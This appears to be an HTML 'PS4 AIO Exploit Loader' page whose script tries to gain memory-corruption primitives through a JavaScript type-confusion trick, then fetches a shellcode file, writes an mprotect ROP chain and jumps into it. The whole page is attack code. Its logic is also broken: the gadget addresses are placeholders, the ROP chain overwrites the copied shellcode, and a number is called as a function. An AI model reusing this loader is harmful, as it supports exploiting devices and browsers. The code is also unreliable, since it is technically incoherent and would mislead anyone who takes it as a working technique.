<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>PS4 Exploit Loader - AIO</title>
<style>
  body { background-color: black; color: lime; font-family: monospace; white-space: pre-wrap; padding: 10px; }
  #log { max-height: 90vh; overflow-y: auto; }
</style>
</head>
<body>
<h1>PS4 AIO Exploit Loader</h1>
<div id="log">inicializando...</div>

<script>
const logEl = document.getElementById('log');
let logData = "";

function log(msg) {
  logData += msg + "\n";
  logEl.textContent = logData;
  logEl.scrollTop = logEl.scrollHeight;
}

//=== utils float↔int
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(f) { f64[0] = f; return BigInt(u32[0]) + (BigInt(u32[1]) << 32n); }
function i2f(i) { u32[0] = Number(i & 0xFFFFFFFFn); u32[1] = Number(i >> 32n); return f64[0]; }

//=== type confusion primitives
let addrof, fakeobj, arb_read, arb_write;
let corrupt;

function setupPrimitives() {
  log("[+] setupPrimitives()");
  corrupt = [1.1, 1.1, 1.1];

  let trigger = { valueOf() { corrupt.length = 1; return 3; } };
  corrupt.map((x, i, arr) => { if (i === 1) arr.length = trigger; return x; });

  let leak = f2i(corrupt[1]);
  log("leak=0x" + leak.toString(16) + " primitives ready");

  let victim = new ArrayBuffer(0x2000);
  let victim_f64 = new Float64Array(victim);

  corrupt[1] = i2f(leak);

  addrof = obj => {
    victim_f64[0] = obj;
    return f2i(corrupt[1]);
  };
  fakeobj = addr => {
    corrupt[1] = i2f(addr);
    return new Float64Array(victim)[0];
  };
  arb_read = addr => {
    corrupt[1] = i2f(addr);
    return f2i(victim_f64[1]);
  };
  arb_write = (addr, val) => {
    corrupt[1] = i2f(addr);
    victim_f64[1] = i2f(val);
  };
}

//=== ROP e Shellcode loader
async function loadAndTrigger() {
  log("[+] loadAndTrigger()");

  try {
    log("[+] fetching aio.bin...");
    let res = await fetch("aio.bin");
    if (!res.ok) throw new Error(res.status);
    let bin = await res.arrayBuffer();
    let bin_view = new Uint8Array(bin);
    log(".bin size=" + bin_view.length + " bytes");

    // Alloc buffer para shellcode
    let shellcode_buf = new ArrayBuffer(bin_view.length + 0x100);
    let shellcode_addr = f2i(corrupt[1]);
    log("shellcode_buf @ 0x" + shellcode_addr.toString(16));

    // Copiar .bin para o buffer
    let shellcode_u8 = new Uint8Array(shellcode_buf);
    for (let i = 0; i < bin_view.length; i++) {
      shellcode_u8[i] = bin_view[i];
    }
    log(".bin injected");

    // ROP para mprotect + saltar para shellcode
    let pop_rdi = 0x10001000n; // trocar pelos gadgets certos!
    let pop_rsi = 0x10002000n;
    let pop_rdx = 0x10003000n;
    let mprotect = 0x10004000n;

    let rop = [
      pop_rdi, shellcode_addr & ~0xfffn, // página alinhada
      pop_rsi, 0x4000n,
      pop_rdx, 7n,
      mprotect,
      shellcode_addr
    ];

    // Escrevendo ROP na memória
    let rop_view = new DataView(shellcode_buf);
    for (let i = 0; i < rop.length; i++) {
      rop_view.setBigUint64(i * 8, rop[i], true);
    }
    log("ROPChain written (" + rop.length + " entries)");

    log("[+] triggering ROP-shellcode");
    let fake = fakeobj(shellcode_addr);
    fake(); // execute ROP → shellcode

  } catch (e) {
    log("!!! error: " + e);
  }
}

//=== Início
setTimeout(() => {
  log("=== Exploit start ===");
  try {
    setupPrimitives();
    loadAndTrigger();
  } catch (e) {
    log("!!! setup error: " + e);
  }
  log("=== done ===");
}, 1000);
</script>

</body>
</html>
